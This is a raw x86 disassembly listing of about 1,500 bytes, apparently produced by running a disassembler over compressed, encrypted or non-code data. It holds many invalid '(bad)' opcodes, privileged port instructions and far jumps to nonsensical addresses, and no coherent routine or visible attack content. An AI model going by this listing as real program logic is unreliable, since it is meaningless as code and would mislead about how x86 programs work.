  409748:	lods   al,BYTE PTR ds:[esi]
  409749:	in     eax,0x4c
  40974b:	imul   BYTE PTR [edx]
  40974d:	mov    ebp,0x2c04ef18
  409752:	mov    dh,0x8a
  409754:	cmp    bl,dh
  409756:	push   0x47
  409758:	shl    ebp,0xfb
  40975b:	push   ds
  40975c:	les    ecx,FWORD PTR [ebp-0x3d]
  40975f:	pop    edx
  409760:	mov    DWORD PTR [edi-0x36],eax
  409763:	xchg   esp,eax
  409764:	xor    ebp,DWORD PTR [ebp+0x36be54c4]
  40976a:	xchg   edi,eax
  40976b:	jae    0x4097ca
  40976d:	std    
  40976e:	mov    ch,0xae
  409770:	in     eax,dx
  409771:	push   0x66
  409773:	int    0xca
  409775:	ds scas al,BYTE PTR es:[edi]
  409777:	dec    WORD PTR [edx]
  40977a:	push   edi
  40977b:	push   ebp
  40977c:	in     al,0x4d
  40977e:	adc    esi,DWORD PTR ds:0x91bdd383
  409784:	inc    eax
  409785:	jo     0x4097ea
  409787:	sub    eax,eax
  409789:	push   edx
  40978a:	ins    BYTE PTR es:[edi],dx
  40978b:	cmc    
  40978c:	rcl    BYTE PTR [eax+ebx*1],1
  40978f:	(bad)  
  409790:	jmp    0xcc18:0x9d9b36f5
  409797:	cmc    
  409798:	jbe    0x4097d8
  40979a:	fldcw  WORD PTR [edx-0xd]
  40979d:	jge    0x4097b9
  40979f:	ins    DWORD PTR es:[edi],dx
  4097a0:	ja     0x40977d
  4097a2:	out    0x7e,eax
  4097a4:	xchg   esp,eax
  4097a5:	popaw  
  4097a7:	jl     0x4097fe
  4097a9:	xor    eax,DWORD PTR [esi+0x6f]
  4097ac:	mov    edi,0x1a60a2cc
  4097b1:	out    0xb0,al
  4097b3:	mov    eax,esi
  4097b5:	push   es
  4097b6:	jno    0x409806
  4097b8:	jp     0x4097ba
  4097ba:	fistp  QWORD PTR [esi-0x6a]
  4097bd:	ja     0x4097a8
  4097bf:	cmp    ch,BYTE PTR [eax-0xf]
  4097c2:	pop    ss
  4097c3:	push   edx
  4097c4:	cmp    al,0xff
  4097c6:	cmp    bl,bh
  4097c8:	mov    al,0xf5
  4097ca:	aam    0xde
  4097cc:	xor    al,0x6e
  4097ce:	xchg   edx,eax
  4097cf:	mov    al,ds:0x1ba932b6
  4097d4:	pop    ds
  4097d5:	cdq    
  4097d6:	or     ecx,DWORD PTR [ebx]
  4097d8:	mov    WORD PTR [edx+0x4b],es
  4097db:	pusha  
  4097dc:	mov    ds:0x839a9ed5,al
  4097e1:	loope  0x4097a6
  4097e3:	sti    
  4097e4:	popa   
  4097e5:	lods   eax,DWORD PTR ds:[esi]
  4097e6:	sbb    al,0x56
  4097e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097e9:	int    0x33
  4097eb:	dec    ebp
  4097ec:	test   eax,0x40b17538
  4097f1:	push   ecx
  4097f2:	inc    eax
  4097f3:	ins    BYTE PTR es:[edi],dx
  4097f4:	cmp    al,0xd9
  4097f6:	or     DWORD PTR [esi],ecx
  4097f8:	dec    edx
  4097f9:	lahf   
  4097fa:	or     eax,0x276b539f
  4097ff:	stos   DWORD PTR es:[edi],eax
  409800:	add    BYTE PTR [edx],0x7e
  409803:	repz js 0x4097b1
  409806:	sbb    edi,DWORD PTR [edx-0x22]
  409809:	shr    DWORD PTR [ecx],0x10
  40980c:	pop    ecx
  40980d:	xor    al,0x4f
  40980f:	mov    dh,0x22
  409811:	jl     0x409803
  409813:	in     al,dx
  409814:	sbb    eax,0xe23392cc
  409819:	hlt    
  40981a:	mov    WORD PTR [ebx],es
  40981c:	push   ecx
  40981d:	sub    BYTE PTR [esi+0x445a8605],dl
  409823:	pop    ebp
  409824:	xlat   BYTE PTR ds:[ebx]
  409825:	pushf  
  409826:	sub    al,0x3
  409828:	test   eax,0xf06bc7bc
  40982d:	sub    al,0xe2
  40982f:	pop    edx
  409830:	cmp    al,0x69
  409832:	cs sbb dl,al
  409835:	adc    DWORD PTR [ebp-0x6fc3300],esp
  40983b:	inc    ebx
  40983c:	adc    dl,BYTE PTR [ecx]
  40983e:	fist   DWORD PTR [ebp+0x2c4eee74]
  409844:	int    0xb0
  409846:	mov    cl,0xca
  409848:	(bad)  
  40984a:	mov    ch,0xa5
  40984c:	push   ss
  40984d:	add    edi,esp
  40984f:	sbb    ebx,DWORD PTR [edi]
  409851:	dec    edi
  409852:	jbe    0x409842
  409854:	addr16 push ecx
  409856:	xchg   ecx,eax
  409857:	cmp    edi,esp
  409859:	sub    edx,ebx
  40985b:	pop    ds
  40985c:	fcom   DWORD PTR [edi+0x20]
  40985f:	lock imul ebp,DWORD PTR [edx],0x35
  409863:	cmp    BYTE PTR [edx+0x14],dh
  409866:	data16 xor dh,BYTE PTR [edx]
  409869:	aas    
  40986a:	jnp    0x409847
  40986c:	inc    edx
  40986d:	test   DWORD PTR [esi-0x61],edx
  409870:	inc    edx
  409871:	mov    eax,0x24beb547
  409876:	(bad)  
  409878:	idiv   DWORD PTR [ecx-0x2de836cd]
  40987e:	and    eax,0xd616cd0a
  409883:	gs inc ebx
  409885:	ja     0x4098b2
  409887:	imul   edi,ebp,0x3976f1c6
  40988d:	clc    
  40988e:	cmp    eax,0x3a4ecbd0
  409893:	sub    al,0xc1
  409895:	daa    
  409896:	mov    bh,0x92
  409898:	stos   DWORD PTR es:[edi],eax
  409899:	cmc    
  40989a:	push   edi
  40989b:	retf   
  40989c:	clc    
  40989d:	jno    0x409915
  40989f:	cmp    esi,ebp
  4098a1:	jle    0x4098f8
  4098a3:	loope  0x40991a
  4098a5:	cdq    
  4098a6:	mov    WORD PTR [ecx],?
  4098a8:	xchg   BYTE PTR [edi],al
  4098aa:	jp     0x4098c1
  4098ac:	imul   ecx,DWORD PTR [ecx+0x6404b181],0x4e01f1ec
  4098b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098b7:	popf   
  4098b8:	imul   esp,ebx,0xffffffd3
  4098bb:	daa    
  4098bc:	retf   
  4098bd:	adc    al,0xba
  4098bf:	js     0x409884
  4098c1:	mov    ah,0x1b
  4098c3:	push   esp
  4098c4:	gs push 0x2c
  4098c7:	adc    cl,BYTE PTR [eax-0x1c]
  4098ca:	sbb    ecx,esi
  4098cc:	cmc    
  4098cd:	mov    ebp,0x4c8dbced
  4098d2:	lods   al,BYTE PTR ds:[esi]
  4098d3:	mov    al,0xb8
  4098d5:	imul   esi,DWORD PTR [ecx-0x4c6a3b1e],0x68
  4098dc:	inc    esi
  4098dd:	test   BYTE PTR ds:0x3b746574,dh
  4098e3:	mov    cl,0x74
  4098e5:	es adc eax,0xd6e50255
  4098eb:	cmc    
  4098ec:	out    dx,eax
  4098ed:	push   ebp
  4098ee:	dec    edx
  4098ef:	je     0x409896
  4098f1:	sbb    DWORD PTR [esi-0x7d],eax
  4098f4:	pop    ebx
  4098f5:	jp     0x40994f
  4098f7:	xlat   BYTE PTR ds:[ebx]
  4098f8:	mov    ecx,edx
  4098fa:	addr16 dec esi
  4098fc:	pop    esp
  4098fd:	or     eax,0xc9beaa4b
  409902:	sar    DWORD PTR [eax-0x250b3bc0],cl
  409908:	outs   dx,DWORD PTR ds:[esi]
  409909:	loop   0x4098d3
  40990b:	dec    esi
  40990c:	into   
  40990d:	inc    edi
  40990e:	cli    
  40990f:	outs   dx,DWORD PTR ds:[esi]
  409910:	mov    edx,0x95def259
  409915:	inc    eax
  409916:	cli    
  409917:	sbb    al,0xab
  409919:	outs   dx,BYTE PTR ds:[esi]
  40991a:	xor    eax,DWORD PTR gs:[ecx-0xed6c80c]
  409921:	mov    bh,0x91
  409923:	mov    dl,0x7b
  409925:	clc    
  409926:	outs   dx,BYTE PTR ds:[esi]
  409927:	aas    
  409928:	lea    esp,[ebx-0x1be46a7a]
  40992e:	mov    dh,0x49
  409930:	jle    0x409938
  409932:	mov    ebx,0x4a50e7ac
  409937:	push   es
  409938:	enter  0x432e,0xe
  40993c:	lahf   
  40993d:	fiadd  DWORD PTR [eax-0x44]
  409940:	sub    al,0xcc
  409942:	xchg   ebx,eax
  409943:	cmp    eax,DWORD PTR [eax-0x491aef87]
  409949:	mov    edi,0x90db80ee
  40994e:	in     al,dx
  40994f:	int    0x98
  409951:	sub    DWORD PTR [esi],0x28
  409954:	mov    al,ds:0x73e4b395
  409959:	or     al,0xf3
  40995b:	sti    
  40995c:	je     0x409979
  40995e:	inc    ecx
  40995f:	mov    cl,0xe1
  409961:	mov    ah,0x83
  409963:	add    DWORD PTR [edi-0x9],0x4ee9ba38
  40996a:	inc    ebx
  40996b:	enter  0xd184,0xea
  40996f:	or     al,BYTE PTR [ebx]
  409971:	mov    bl,bh
  409973:	loopne 0x4099ae
  409975:	inc    ecx
  409976:	inc    ecx
  409977:	jg     0x4099aa
  409979:	xor    esp,DWORD PTR [esi-0x277bd70a]
  40997f:	xchg   ebx,eax
  409980:	add    BYTE PTR [edi],bl
  409982:	or     eax,0xd4def61e
  409987:	loop   0x4099f0
  409989:	jnp    0x40998c
  40998b:	sub    bl,BYTE PTR [ebx-0x77]
  40998e:	out    0x4a,al
  409990:	mov    BYTE PTR [ebp-0x1bbd7c1e],cl
  409996:	pop    ebp
  409997:	dec    ebx
  409998:	das    
  409999:	mov    ebp,0x9645a5b4
  40999e:	ja     0x409a1a
  4099a0:	push   esi
  4099a1:	jns    0x409a09
  4099a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099a4:	xchg   DWORD PTR [edx+0x4bbc68fb],edx
  4099aa:	imul   ebp,eax,0x14157d2
  4099b0:	(bad)  
  4099b1:	fdiv   QWORD PTR [ecx]
  4099b3:	cwde   
  4099b4:	rol    esi,1
  4099b6:	mov    dl,0x6b
  4099b8:	mov    bh,0x9d
  4099ba:	popa   
  4099bb:	das    
  4099bc:	ins    DWORD PTR es:[edi],dx
  4099bd:	lds    ecx,FWORD PTR [ebx+0x52dd5fcf]
  4099c3:	or     edi,DWORD PTR [eax+0x44]
  4099c6:	jge    0x409950
  4099c8:	mov    ah,0xcc
  4099ca:	fdiv   st(0),st
  4099cc:	and    eax,0x66384ad4
  4099d1:	and    BYTE PTR [esi-0x2df6f153],al
  4099d7:	add    al,0xf2
  4099d9:	in     eax,0x32
  4099db:	push   ebx
  4099dc:	dec    eax
  4099dd:	mov    al,ds:0xb716ea78
  4099e2:	mov    esi,0xdec7faa2
  4099e7:	or     ebp,DWORD PTR [ebx]
  4099e9:	pop    ebx
  4099ea:	in     eax,0x8e
  4099ec:	inc    eax
  4099ed:	scas   eax,DWORD PTR es:[edi]
  4099ee:	xchg   edx,eax
  4099ef:	push   edx
  4099f0:	imul   esp,DWORD PTR [edi-0x5b5254ee],0x63
  4099f7:	iret   
  4099f8:	pop    ecx
  4099f9:	add    BYTE PTR [edi+0x69],bh
  4099fc:	jg     0x409a5b
  4099fe:	(bad)  
  4099ff:	sbb    eax,0xc5a25490
  409a04:	cld    
  409a05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a06:	fld    TBYTE PTR es:[ebx+0x4817ba8f]
  409a0d:	ins    DWORD PTR es:[edi],dx
  409a0e:	inc    ecx
  409a0f:	sbb    eax,0xd9dbea67
  409a14:	cld    
  409a15:	sub    edx,DWORD PTR [ebx]
  409a17:	jecxz  0x409a92
  409a19:	test   eax,0xd504674b
  409a1e:	add    edi,DWORD PTR [ebx-0x4faf231b]
  409a24:	sub    ch,al
  409a26:	mov    fs,WORD PTR [esi]
  409a28:	out    0xca,al
  409a2a:	aaa    
  409a2b:	cs cmp eax,0x43a7bfc7
  409a31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a32:	push   ss
  409a33:	mov    ds:0xef1b5ca4,eax
  409a38:	mov    eax,ds:0x974911ab
  409a3d:	cwde   
  409a3e:	mov    dh,0xe7
  409a40:	and    dh,BYTE PTR [eax]
  409a42:	and    BYTE PTR [edx-0x120a91f4],0xa3
  409a49:	into   
  409a4a:	pusha  
  409a4b:	aam    0x9d
  409a4d:	cli    
  409a4e:	hlt    
  409a4f:	and    BYTE PTR [eax],bl
  409a51:	aaa    
  409a52:	dec    ebx
  409a53:	out    0x81,al
  409a55:	mov    cl,0x77
  409a57:	or     ecx,DWORD PTR [edi+0x4c]
  409a5a:	out    0x5a,al
  409a5c:	repnz xor DWORD PTR [ebp+0x734faa9b],ecx
  409a63:	mov    esp,0xe84465bc
  409a68:	push   eax
  409a69:	dec    ebp
  409a6a:	sbb    eax,0xc5e6687e
  409a6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a70:	mov    dl,0xcc
  409a72:	ss dec eax
  409a74:	sbb    edi,ebp
  409a76:	sti    
  409a77:	push   ecx
  409a78:	inc    ebp
  409a79:	dec    ecx
  409a7a:	push   ebp
  409a7b:	mov    eax,0x7f2e4c29
  409a80:	push   0xffffffd5
  409a82:	nop
  409a83:	test   esi,esp
  409a85:	cmp    eax,0x24722c8e
  409a8a:	push   edi
  409a8b:	add    edx,0xffffffc2
  409a8e:	xchg   edx,eax
  409a8f:	adc    esp,DWORD PTR ds:0x83de52cf
  409a95:	sbb    al,0xf8
  409a97:	or     DWORD PTR [ebx-0x7ef482e2],eax
  409a9d:	pop    edi
  409a9e:	xadd   BYTE PTR [edx+0x7999e859],dh
  409aa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409aa6:	arpl   WORD PTR [edi+0x722c4b99],bp
  409aac:	imul   esp,DWORD PTR [eax+0x6528f044],0x939f4cee
  409ab6:	in     eax,dx
  409ab7:	sbb    cl,BYTE PTR [ecx]
  409ab9:	jb     0x409ab7
  409abb:	jp     0x409ab8
  409abd:	ret    0x4d99
  409ac0:	test   ch,dh
  409ac2:	mov    cl,BYTE PTR [eax]
  409ac4:	inc    ebp
  409ac5:	rol    BYTE PTR [eax-0x30e5dabb],1
  409acb:	dec    eax
  409acc:	push   ds
  409acd:	iret   
  409ace:	mov    ecx,0x21f13d96
  409ad4:	(bad)  
  409ad6:	popa   
  409ad7:	or     eax,0xd636117c
  409adc:	inc    ecx
  409add:	or     al,0x6d
  409adf:	clc    
  409ae0:	jmp    0x72ca:0xaa4f04da
  409ae7:	mov    dl,0x79
  409ae9:	cmp    al,0x49
  409aeb:	iret   
  409aec:	jecxz  0x409aaa
  409aee:	xchg   BYTE PTR [edi+eiz*8],dl
  409af1:	call   0x983265da
  409af6:	jmp    0x409b2a
  409af8:	(bad)  
  409af9:	std    
  409afa:	popa   
  409afb:	pop    edx
  409afc:	mov    bh,0x8
  409afe:	or     esp,edi
  409b00:	test   eax,0x8eefaec7
  409b05:	xchg   ebx,eax
  409b06:	and    BYTE PTR [ebp-0x9cd6587],dh
  409b0c:	fidivr WORD PTR ds:0xc08e5d93
  409b12:	test   al,0x83
  409b14:	cwde   
  409b15:	out    dx,eax
  409b16:	cli    
  409b17:	out    0xe3,al
  409b19:	out    dx,al
  409b1a:	dec    ebx
  409b1b:	into   
  409b1c:	pop    ebp
  409b1d:	(bad)  
  409b1e:	pop    ss
  409b1f:	das    
  409b20:	sub    eax,0xb621b2a8
  409b25:	rol    bl,0x92
  409b28:	pop    ss
  409b29:	sub    al,0xc1
  409b2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b2c:	push   ebx
  409b2d:	mov    ds:0x688d45ff,eax
  409b32:	xchg   esp,eax
  409b33:	ins    BYTE PTR es:[edi],dx
  409b34:	push   esi
  409b35:	daa    
  409b36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b37:	push   ebp
  409b38:	push   cs
  409b39:	sti    
  409b3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b3b:	cld    
  409b3c:	add    eax,0x6b9ce3f0
  409b41:	push   ebx
  409b42:	dec    ebx
  409b43:	sbb    eax,0x486b4662
  409b48:	mov    BYTE PTR [ecx],bl
  409b4a:	xchg   ebx,eax
  409b4b:	mov    ebp,0x40a08897
  409b50:	sbb    BYTE PTR [ecx],ah
  409b52:	gs jl  0x409b15
  409b55:	test   BYTE PTR [ecx],bl
  409b57:	jne    0x409b61
  409b59:	fcmove st,st(6)
  409b5b:	sub    DWORD PTR ds:[edx],eax
  409b5e:	xor    eax,0xbc102be3
  409b63:	(bad)  
  409b65:	pop    ebp
  409b66:	or     eax,0xaed57228
  409b6b:	dec    esp
  409b6c:	cmc    
  409b6d:	popa   
  409b6e:	scas   eax,DWORD PTR es:[edi]
  409b6f:	jne    0x409b42
  409b71:	int    0x94
  409b73:	sub    eax,0x61c088f9
  409b78:	sub    BYTE PTR [eax+eax*2],dh
  409b7b:	push   ebp
  409b7c:	(bad)  
  409b7e:	add    DWORD PTR ds:0xb0e31fdf,0x51482e89
  409b88:	repnz out 0xb7,eax
  409b8b:	mov    dh,0x97
  409b8d:	ror    DWORD PTR [ebx+0x58eeaecf],0x8a
  409b94:	pop    edx
  409b95:	stc    
  409b96:	iret   
  409b97:	lods   eax,DWORD PTR ds:[esi]
  409b98:	test   al,0xc
  409b9a:	xchg   edx,edi
  409b9c:	dec    ecx
  409b9d:	ficomp DWORD PTR [eax+0x3a]
  409ba0:	cmp    bh,BYTE PTR [ebp-0x6c]
  409ba3:	stos   BYTE PTR es:[edi],al
  409ba4:	cmp    eax,0x3c651d54
  409ba9:	fwait
  409baa:	out    dx,al
  409bab:	fsub   DWORD PTR ds:0x2f091133
  409bb1:	and    BYTE PTR [edx],dh
  409bb3:	inc    esi
  409bb4:	out    dx,eax
  409bb5:	or     BYTE PTR [ecx-0x64],al
  409bb8:	stos   BYTE PTR es:[edi],al
  409bb9:	xchg   ebx,eax
  409bba:	mov    bl,0xcf
  409bbc:	call   0x28524016
  409bc1:	dec    ebx
  409bc2:	ins    BYTE PTR es:[edi],dx
  409bc3:	pop    edx
  409bc4:	or     eax,0xf3c5d3f4
  409bc9:	outs   dx,BYTE PTR ds:[esi]
  409bca:	stos   BYTE PTR es:[edi],al
  409bcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bcc:	jle    0x409b54
  409bce:	mov    bh,0x60
  409bd0:	add    eax,eax
  409bd2:	(bad)  
  409bd3:	mov    eax,0x38796974
  409bd8:	fadd   QWORD PTR [ebp-0x3c]
  409bdb:	mov    ecx,0x3467eeb7
  409be0:	in     eax,dx
  409be1:	mov    eax,ds:0x26d37ef9
  409be6:	fiadd  WORD PTR [ebx-0x7cc6ef7b]
  409bec:	and    al,0x9d
  409bee:	lods   al,BYTE PTR ds:[esi]
  409bef:	(bad)  
  409bf0:	fs jae 0x409ba5
  409bf3:	rcr    dl,0xd9
  409bf6:	bound  esi,QWORD PTR [ebp-0x24]
  409bf9:	xchg   ebp,eax
  409bfa:	shl    esp,cl
  409bfc:	push   edx
  409bfd:	lock dec ebp
  409bff:	push   eax
  409c00:	sbb    al,0x80
  409c02:	fst    DWORD PTR [esi-0x1a]
  409c05:	repnz push edi
  409c07:	inc    edx
  409c08:	repz lahf 
  409c0a:	cmp    cl,BYTE PTR [esp+eax*1]
  409c0d:	pop    ebp
  409c0e:	adc    al,0x42
  409c10:	pop    esp
  409c11:	call   0x2d2b:0x2378a027
  409c18:	xor    bh,bh
  409c1a:	ss loope 0x409c91
  409c1d:	pop    ebx
  409c1e:	enter  0x6416,0xe7
  409c22:	ret    
  409c23:	adc    DWORD PTR ds:0x898a9009,edi
  409c29:	es sub eax,0x4ade4aac
  409c2f:	add    al,0x5a
  409c31:	enter  0x1d79,0x33
  409c35:	loopne 0x409c40
  409c37:	pop    ebx
  409c38:	hlt    
  409c39:	dec    edi
  409c3a:	aad    0x9b
  409c3c:	mov    ecx,0xd841c18a
  409c41:	cwde   
  409c42:	adc    DWORD PTR [eax],esp
  409c44:	pop    edi
  409c45:	repz adc bl,BYTE PTR [ecx-0x3ff10dd5]
  409c4c:	sub    eax,0xd42576e2
  409c51:	adc    al,0x97
  409c53:	mov    bh,0x30
  409c55:	push   DWORD PTR [edx+eiz*1+0x8609b5f]
  409c5c:	or     BYTE PTR [ecx-0x51],0x89
  409c60:	mov    cl,0xae
  409c62:	int3   
  409c63:	ja     0x409cac
  409c65:	out    0xc7,al
  409c67:	push   ebx
  409c68:	jno    0x409cb5
  409c6a:	lahf   
  409c6b:	daa    
  409c6c:	pop    ds
  409c6d:	into   
  409c6e:	mov    ds:0x732a19d0,eax
  409c73:	hlt    
  409c74:	arpl   WORD PTR [ebp+0x5fa56638],bp
  409c7a:	mov    ds:0x1ea53f33,eax
  409c7f:	pop    ebx
  409c80:	sahf   
  409c81:	dec    BYTE PTR ds:[ecx-0x1e]
  409c85:	sbb    BYTE PTR [esi+0x0],dh
  409c88:	add    ah,BYTE PTR [ebx]
  409c8a:	jle    0x409c0d
  409c8c:	enter  0x3f50,0x1d
  409c90:	jecxz  0x409c64
  409c92:	(bad)  
  409c93:	iret   
  409c94:	imul   esp,esp,0xffffffa4
  409c97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c98:	cmp    ecx,esi
  409c9a:	mov    DWORD PTR [eax+0x227019dc],ebx
  409ca0:	or     DWORD PTR [ebx+0x41e13ec7],0x7c3570a5
  409caa:	pcmpeqb mm0,QWORD PTR [esp+ecx*1+0x2f740265]
  409cb2:	xor    bh,bl
  409cb4:	ror    BYTE PTR [esp+edi*2-0xb],0x5e
  409cb9:	push   ss
  409cba:	pop    es
  409cbb:	xchg   ebx,eax
  409cbc:	or     bh,BYTE PTR [edi+0x6b32b008]
  409cc2:	ss mov dl,0xf9
  409cc5:	xchg   ecx,eax
  409cc6:	jmp    0x409c72
  409cc8:	icebp  
  409cc9:	push   es
  409cca:	sub    esp,DWORD PTR [edx*2-0x372f60f1]
  409cd1:	cmp    al,0xf7
  409cd3:	jmp    0x409cfc
  409cd5:	dec    edi
  409cd6:	ins    BYTE PTR es:[edi],dx
  409cd7:	test   al,0xa9
  409cd9:	cmc    
  409cda:	fisub  WORD PTR [ebx]
  409cdc:	and    cl,ah
  409cde:	jmp    0x409cb7
  409ce0:	nop
  409ce1:	xchg   DWORD PTR [ecx+edi*1],esp
  409ce4:	lds    edx,FWORD PTR [edi+0x23be03c9]
  409cea:	inc    ecx
  409ceb:	mov    ch,0x1d
  409ced:	inc    edx
  409cee:	jnp    0x409d47
  409cf0:	mov    dh,0xa1
  409cf2:	or     al,0x8d
  409cf4:	pop    ds
  409cf5:	adc    eax,0x125d853d
  409cfa:	add    edx,DWORD PTR [esi-0x60c16adc]
  409d00:	fiadd  DWORD PTR [ebp-0x5b]
  409d03:	pop    ebp
  409d04:	mov    ebp,0xb9f1b96b
  409d09:	(bad)  
  409d0a:	inc    ecx
  409d0b:	data16 mov bl,0x2d
  409d0e:	imul   ecx,ebx,0xffffffcb
  409d11:	xor    DWORD PTR [edx],edx
  409d13:	push   esp
  409d14:	dec    esi
  409d15:	fnstenv [eax-0x5c]
  409d18:	push   esp
  409d19:	mov    esi,0xfa0e56bf
  409d1e:	fisttp WORD PTR [eax+0x17c22b23]
  409d24:	jge    0x409d6e
  409d26:	push   cs
  409d27:	fs xchg edx,eax
  409d29:	add    DWORD PTR [esi],edi
  409d2b:	pop    ebx
  409d2c:	jbe    0x409d14
  409d2e:	out    0xbb,al
  409d30:	sti    
  409d31:	in     al,dx
  409d32:	sub    ebp,DWORD PTR [eax+0x1c]
  409d35:	mov    edx,0xfca0a6ec
  409d3a:	ja     0x409d89
  409d3c:	dec    ebp
  409d3d:	lsl    eax,WORD PTR [ecx]
  409d40:	mov    edi,0x93a85c58
  409d45:	imul   esi,DWORD PTR [esi-0x3ab5187],0x25da32ce
  409d4f:	mov    eax,0x73d5d2a0
  409d54:	pop    edi
  409d55:	in     al,dx
  409d56:	inc    esi
  409d57:	hlt    
  409d58:	cli    
  409d59:	mov    ah,0x9b
  409d5b:	inc    esi
  409d5c:	out    dx,eax
  409d5d:	mov    bh,dh
  409d5f:	dec    ebp
  409d60:	jg     0x409d7b
  409d62:	stc    
  409d63:	int3   
  409d64:	retf   0xf8ef
  409d67:	ret    0xda6
  409d6a:	mov    cl,0x63
  409d6c:	cmp    BYTE PTR [ecx+0x51],cl
  409d6f:	dec    ebx
  409d70:	add    esp,ecx
  409d72:	outs   dx,DWORD PTR ds:[esi]
  409d73:	cmc    
  409d74:	push   eax
  409d75:	pushf  
  409d76:	jnp    0x409d18
  409d78:	dec    esi
  409d79:	sbb    eax,0x8ea50e1b
  409d7e:	jne    0x409d8d
  409d80:	out    0xf2,al
  409d82:	sub    dh,ch
  409d84:	xor    eax,esp
  409d86:	jns    0x409d4e
  409d88:	mov    DWORD PTR [edi+0x6ab57154],edi
  409d8e:	adc    dh,BYTE PTR [edi+0x7dcdd1d2]
  409d94:	jmp    0x409dcd
  409d96:	or     dl,BYTE PTR [edi-0x152457a5]
  409d9c:	inc    ecx
  409d9d:	pop    ecx
  409d9e:	mov    al,ds:0xa4d1cd6b
  409da3:	lock ret 0xdc5b
  409da7:	int    0xc4
  409da9:	pop    esp
  409daa:	fist   WORD PTR [edx-0x27341b60]
  409db0:	(bad)  
  409db1:	mov    ah,0x5e
  409db3:	test   al,0xf9
  409db5:	xor    al,BYTE PTR [edi+0x529a9c7e]
  409dbb:	mov    eax,ds:0xab5a5766
  409dc0:	daa    
  409dc1:	je     0x409e16
  409dc3:	cmc    
  409dc4:	sub    ecx,DWORD PTR [eax]
  409dc6:	fdivr  st(4),st
  409dc8:	ins    BYTE PTR es:[edi],dx
  409dc9:	add    esi,DWORD PTR [ebp+0x6b]
  409dcc:	mov    bh,0x74
  409dce:	les    ebp,FWORD PTR [esi-0x45]
  409dd1:	clc    
  409dd2:	mov    DWORD PTR [esp+ebx*4+0x63c38a29],ebx
  409dd9:	mov    al,0xee
  409ddb:	mov    WORD PTR [ebx+0x7a3bcce9],ds
  409de1:	jecxz  0x409dac
  409de3:	imul   ebp,edi,0x57
  409de6:	xchg   ebp,eax
  409de7:	sub    cl,dl
  409de9:	add    BYTE PTR ds:0xf78bdd74,bh
  409def:	stos   DWORD PTR es:[edi],eax
  409df0:	mov    esp,0x25c4a503
  409df5:	mov    DWORD PTR [ebx],esp
  409df7:	fdivr  QWORD PTR [edx]
  409df9:	btr    WORD PTR [ebx],ax
  409dfd:	or     al,0x44
  409dff:	adc    BYTE PTR [eax],0x41
  409e02:	inc    ebx
  409e03:	push   edi
  409e04:	dec    esp
  409e05:	out    dx,eax
  409e06:	stos   DWORD PTR es:[edi],eax
  409e07:	inc    ebp
  409e08:	cmc    
  409e09:	shr    BYTE PTR [ecx],cl
  409e0b:	jl     0x409d94
  409e0d:	rcr    BYTE PTR [edx+0x26],cl
  409e10:	xchg   ebp,eax
  409e11:	push   0xb8a6329d
  409e16:	and    ecx,esp
  409e18:	dec    edi
  409e19:	mov    edi,0x296e8fd3
  409e1e:	add    al,0x7e
  409e20:	ror    BYTE PTR [edi+eax*1-0x7e7546b7],0x3b
  409e28:	mov    ch,BYTE PTR [ecx]
  409e2a:	mov    WORD PTR [esi-0x19],cs
  409e2d:	fistp  DWORD PTR [eax+0x24841efc]
  409e33:	or     DWORD PTR [esi+0x30],esi
  409e36:	cmp    ch,BYTE PTR [esi]
  409e38:	popa   
  409e39:	ds imul ebp,edi,0x618a5825
  409e40:	outs   dx,DWORD PTR ds:[esi]
  409e41:	mov    ds:0x7af14f07,al
  409e46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e47:	pop    esp
  409e48:	adc    dh,BYTE PTR [esi+0x78]
  409e4b:	push   ss
  409e4c:	inc    ecx
  409e4d:	mov    ebx,0x301eb616
  409e52:	xchg   ecx,esi
  409e54:	out    0x71,al
  409e56:	jp     0x409e43
  409e58:	jmp    0x409e37
  409e5a:	je     0x409e87
  409e5c:	(bad)  
  409e5d:	out    0xd,eax
  409e5f:	outs   dx,DWORD PTR ds:[esi]
  409e60:	bound  edx,QWORD PTR [edi+0x29168849]
  409e66:	xor    eax,0x7ca36585
  409e6b:	cmp    al,ch
  409e6d:	retf   0xc9d0
  409e70:	xchg   edi,eax
  409e71:	repz test ch,dl
  409e74:	fstp   QWORD PTR [ebp-0x41]
  409e77:	inc    edx
  409e78:	bound  edi,QWORD PTR [ebx+edx*1+0x4d]
  409e7c:	add    bh,BYTE PTR [eax+0x342ba70]
  409e82:	sbb    al,0x30
  409e84:	int3   
  409e85:	jle    0x409e7c
  409e87:	mov    ds:0xe6f1d6c6,al
  409e8c:	or     DWORD PTR [ebx-0x3b6be56],esp
  409e92:	inc    ebp
  409e93:	xchg   ecx,eax
  409e94:	adc    BYTE PTR [edx],ah
  409e96:	inc    eax
  409e97:	push   0xd26ad1d0
  409e9c:	outs   dx,BYTE PTR ds:[esi]
  409e9d:	ficomp DWORD PTR [edx+0x459d406a]
  409ea3:	call   0xdf86:0x527c5d78
  409eaa:	(bad)  
  409eab:	sub    eax,0xcd381919
  409eb0:	jl     0x409e79
  409eb2:	inc    edx
  409eb3:	mov    esp,0x4de9508e
  409eb8:	in     eax,0x2d
  409eba:	or     al,0xb8
  409ebc:	or     al,0xa6
  409ebe:	rcr    BYTE PTR [edx-0x7dade3bc],0xf4
  409ec5:	shl    DWORD PTR [edx+edx*8],1
  409ec8:	mov    ah,0x37
  409eca:	out    dx,eax
  409ecb:	or     esi,DWORD PTR ds:0xef88fd64
  409ed1:	sub    edi,DWORD PTR [ebx+edi*8-0x16]
  409ed5:	(bad)  
  409ed6:	sbb    eax,0x2f6d0038
  409edb:	mov    ecx,DWORD PTR [edx+0x3]
  409ede:	and    esp,DWORD PTR [edx]
  409ee0:	stos   DWORD PTR es:[edi],eax
  409ee1:	xchg   BYTE PTR [esi],al
  409ee3:	rol    DWORD PTR [esi+ebp*4+0x12],cl
  409ee7:	mov    al,0xdc
